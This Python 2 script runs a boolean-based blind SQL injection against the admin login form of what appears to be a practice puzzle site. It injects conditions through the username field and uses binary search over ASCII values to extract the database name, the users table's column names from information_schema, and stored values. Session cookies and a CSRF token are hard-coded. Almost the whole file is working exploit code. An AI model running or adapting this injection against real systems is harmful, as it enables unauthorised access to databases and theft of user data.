# coding:utf-8

import urllib2
import urllib

headers = {
    'Cookie': 'gr_user_id=3949c66a-56d6-49be-99e6-dc48710481cd; uuid=5811c0d121dd4; è¿é¢çç­æ¡æ¯oreo=eyJpdiI6Ik13RVwvTVlPd0pHMGFkWTJFdElndnhRPT0iLCJ2YWx1ZSI6ImJKUlMxaFA4a1lYV2J3b0NnN0ZUS1E9PSIsIm1hYyI6ImRjZTBjYjU4NDg5ZjNjYjk5OGNmZmE0MTk2MWU1NmIyMTA4NmViMmM2OWUxYTA3NjdhYjNiODdlOTNkMmFlNTYifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IndsTFlJekoreDNFcTltQjJvQWYwNVE9PSIsInZhbHVlIjoiYis4SnV6SjliMWRhRVc0VnJzOVNCZGd6THREVENtOVR2ejV5QUQwRVNLdElFa2taeCs3cWJteVBseVdhdXJ2ZEI3SWRPd3pmNnRXSHNaeERBcVdaRHc9PSIsIm1hYyI6IjBhODM4MjczODQ3MmU3MDgzNWQ2OThiMGVmYzdkMjEzNWNhOWRiNmMxMjgzNDlkYjI1ZjBlYjMxYWU0NjVhZjcifQ%3D%3D; laravel_session=eyJpdiI6IkpPWGlaWXBmSWkzYVwvdE5NYTdUbWR3PT0iLCJ2YWx1ZSI6IndxZXN4MUdFc0pQTkFLZENWM1ZxMmxuMkRzODh0R0dUQ2liVVlJYlZkTmpodUVnR3g0YzR2bnRMNVBiR1hkMkhMdHN1RXFyY3NJME12VGtTWUFYa0pnPT0iLCJtYWMiOiI1NjAxODE1MjM5YjNiYzYyMDE5NjBlZTRlNWNlOWYxNzllY2Y5NjQ1ZThlNjI3N2MwOWI1YmY1ZWFmNDgyZTdlIn0%3D; gr_session_id_80dfd8ec4495dedb=00c7f621-140a-44d1-b53c-d356c37de177; Hm_lvt_420590b976ac0a82d0b82a80985a3b8a=1477531541,1477533371,1477535066,1477558482; Hm_lpvt_420590b976ac0a82d0b82a80985a3b8a=1477566715',
}

data = {
    '_token': 'XaWes4eXOqUlBXv4c5LtQuqqiwIQ4ZZLpg6HHHvE',
    'username': '',
    'password': ''
}

fail_message = '账号或密码错误'
suc_message = '恭喜你,这题的答案是 c3p0'


def get_token(username_sql):
    request = urllib2.Request('http://www.qlcoder.com/train/admin', headers=headers)
    data['username'] = username_sql
    data_str = urllib.urlencode(data)
    global response_stream
    try:
        response_stream = urllib2.urlopen(request, data_str)
        html_str = response_stream.read()
        return html_str
    except urllib2.HTTPError as err:
        print 'sql syntax error'
        print ''.join(err.readlines())


def is_successful(html):
    if fail_message in html:
        return False
    elif suc_message in html:
        return True
    else:
        print 'error syntax'
        return False


def generate_query_str(injection_str):
    return "shinian' " + injection_str + "# "


# length is 7
def get_db_length():
    for i in range(30):
        query_str = generate_query_str(
            "and length(database())=" + str(i))
        print query_str
        html = get_token(query_str)
        if is_successful(html):
            print 'got it', i
        else:
            print 'fail'


def get_db_name():
    for j in range(1, 8):
        for i in range(97, 127):
            query_str = generate_query_str(
                "and substr(database()," + str(j) + ",1)=" + "'" + str(chr(i)) + "'")
            print query_str
            html = get_token(query_str)
            if is_successful(html):
                print 'got it', chr(i)
                break


def check_db_name():
    query_str = generate_query_str(
        "and database()='qlcoder'")
    print query_str
    html = get_token(query_str)
    if is_successful(html):
        print 'got it'


# qlcoder is the database
# company, title, avatar%, password, email, created_at, updated_at, remember_token, location, score
def check_schema():
    all_rows = []
    is_all_recorded = False
    for row_idx in range(1, 1000):
        tmp_cols = []
        for col_idx in range(1, 1000):
            small_idx = 32
            large_idx = 127
            is_end = False
            while True:
                cond_str = " and column_name not like 'avatar%'" \
                           + " and column_name!='name' and column_name!='password' " \
                             "and column_name!='email' and column_name!='created_at' and column_name!='updated_at' " \
                             " and column_name!='remember_token' "
                query_str = generate_query_str(
                    "and ascii(substr((select column_name from information_schema.columns "
                    "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
                        row_idx) + ",1),"
                    + str(col_idx) + ",1))>=" + str(small_idx) +
                    " and ascii(substr((select column_name from information_schema.columns "
                    "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
                        row_idx) + ",1),"
                    + str(col_idx) + ",1))<=" + str(large_idx))
                # print query_str
                if not is_successful(get_token(query_str)):
                    is_end = True
                    break

                middle_idx = (small_idx + large_idx) / 2
                query_str = generate_query_str(
                    "and ascii(substr((select column_name from information_schema.columns "
                    "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
                        row_idx) + ",1),"
                    + str(col_idx) + ",1))=" + str(middle_idx))
                # print query_str
                if is_successful(get_token(query_str)):
                    print 'find it', str((row_idx, col_idx)), ':', chr(middle_idx)
                    tmp_cols.append(chr(middle_idx))
                    break
                else:
                    query_str = generate_query_str(
                        "and ascii(substr((select column_name from information_schema.columns "
                        "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
                            row_idx) + ",1),"
                        + str(col_idx) + ",1))<" + str(middle_idx))
                    # print query_str
                    if is_successful(get_token(query_str)):
                        large_idx = middle_idx
                    else:
                        small_idx = middle_idx
            if is_end:
                if len(tmp_cols) > 0:
                    all_rows.append(''.join(tmp_cols))
                    print ''.join(tmp_cols)
                else:
                    is_all_recorded = True
                break
        if is_all_recorded:
            break
    print all_rows


# avatar_content_type
def check_iterms():
    for k in range(1, 10):
        for j in range(1, 10):
            for i in range(97, 128):
                query_str = generate_query_str(
                    "and ascii(substr((select column_name from information_schema.columns "
                    "where table_schema='qlcoder' and table_name='items0' limit " + str(k) + ",1)," + str(
                        j) + ",1))=" + str(i))
                print query_str
                html = get_token(query_str)
                if is_successful(html):
                    print 'got it', chr(i)
                    break
            if i == 127:
                break


def check_strings():
    all_rows = []
    is_all_recorded = False
    for row_idx in range(1, 1000):
        tmp_cols = []
        for col_idx in range(1, 1000):
            small_idx = 32
            large_idx = 127
            is_end = False
            while True:
                query_str = generate_query_str(
                    "and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
                        row_idx) + ",1),"
                    + str(col_idx) + ",1))>=" + str(small_idx) +
                    " and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
                        row_idx) + ",1),"
                    + str(col_idx) + ",1))<=" + str(large_idx))
                print query_str
                if not is_successful(get_token(query_str)):
                    is_end = True
                    break

                middle_idx = (small_idx + large_idx) / 2
                query_str = generate_query_str(
                    "and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
                        row_idx) + ",1),"
                    + str(col_idx) + ",1))=" + str(middle_idx))
                if is_successful(get_token(query_str)):
                    print 'find it', str((row_idx, col_idx)), ':', chr(middle_idx)
                    tmp_cols.append(chr(middle_idx))
                    break
                else:
                    query_str = generate_query_str(
                        "and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
                            row_idx) + ",1),"
                        + str(col_idx) + ",1))<" + str(middle_idx))
                    if is_successful(get_token(query_str)):
                        large_idx = middle_idx
                    else:
                        small_idx = middle_idx
            if is_end:
                if len(tmp_cols) > 0:
                    all_rows.append(''.join(tmp_cols))
                    print ''.join(tmp_cols)
                else:
                    is_all_recorded = True
                break
        if is_all_recorded:
            break
    print all_rows


check_schema()
# check_db_name()
# check_strings()
